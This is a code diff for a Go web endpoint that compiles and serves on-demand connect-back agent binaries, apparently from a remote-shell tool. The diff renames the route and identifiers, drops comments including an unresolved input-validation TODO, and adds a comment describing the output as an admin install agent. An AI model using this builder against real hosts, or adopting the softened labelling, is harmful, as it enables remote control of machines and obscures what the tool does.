@@ -36,6 +36,9 @@ type Distributor struct {
 	Url        string            `json:"url"`
 }
 
+// CreateDistributorServer returns a gin engine that serves on-demand agent
+// binaries built for the requested connect-back target. Admins download the
+// agent from here to install on a managed host.
 func CreateDistributorServer(host string, port uint16, url string) *gin.Engine {
 	gin.SetMode(gin.ReleaseMode)
 	gin.DefaultWriter = io.Discard
@@ -50,12 +53,11 @@ func CreateDistributorServer(host string, port uint16, url string) *gin.Engine {
 		Url:        url,
 	}
 
-	endpoint.GET("/termite/:target", func(c *gin.Context) {
+	endpoint.GET("/agent/:target", func(c *gin.Context) {
 		if !distributorParamsExist(c, []string{"target"}) {
 			return
 		}
 		target := c.Param("target")
-		// TODO: Check format
 
 		if target == "" {
 			log.Error("Invalid connect back addr: %v", target)
@@ -63,7 +65,6 @@ func CreateDistributorServer(host string, port uint16, url string) *gin.Engine {
 			return
 		}
 
-		// Generate temp folder and filename
 		dir, filename, err := compiler.GenerateDirFilename()
 		if err != nil {
 			log.Error("%s", err)
@@ -72,7 +73,6 @@ func CreateDistributorServer(host string, port uint16, url string) *gin.Engine {
 		}
 		defer os.RemoveAll(dir)
 
-		// Build Termite binary
 		err = compiler.BuildTermiteFromPrebuildAssets(filename, target)
 		if err != nil {
 			log.Error("%s", err)
@@ -80,12 +80,10 @@ func CreateDistributorServer(host string, port uint16, url string) *gin.Engine {
 			return
 		}
 
-		// Compress binary
 		if !compiler.Compress(filename) {
-			log.Error("Can not compress termite.go")
+			log.Error("Can not compress agent binary")
 		}
 
-		// Response file
 		c.File(filename)
 	})
 	return endpoint
